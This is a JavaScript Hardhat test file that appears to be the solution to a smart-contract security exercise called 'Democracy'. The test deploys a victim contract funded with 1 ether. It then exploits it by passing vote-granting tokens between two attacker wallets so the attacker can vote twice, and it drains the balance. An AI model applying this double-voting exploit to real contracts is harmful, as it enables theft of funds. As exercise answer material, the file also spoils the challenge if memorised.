const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const value = ethers.utils.parseEther("1");

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy({ value });

    return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, attackerWallet;
    before(async function () {
      ({ victimContract, attackerWallet } = await loadFixture(setup));
    })

    it("conduct your attack here", async function () {
      const [, , attackerWallet2] = await ethers.getSigners();
      const contract = victimContract.connect(attackerWallet);
      await contract.nominateChallenger(attackerWallet.address);
      await contract["safeTransferFrom(address,address,uint256)"](attackerWallet.address, attackerWallet2.address, 0);
      await contract.vote(attackerWallet.address);
      await contract.transferFrom(attackerWallet.address, attackerWallet2.address, 1);
      await victimContract
        .connect(attackerWallet2)
        .vote(attackerWallet.address);
      await contract.withdrawToAddress(attackerWallet.address);
    });

    after(async function () {
      const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
      expect(victimContractBalance).to.be.equal('0');
    });
  });
});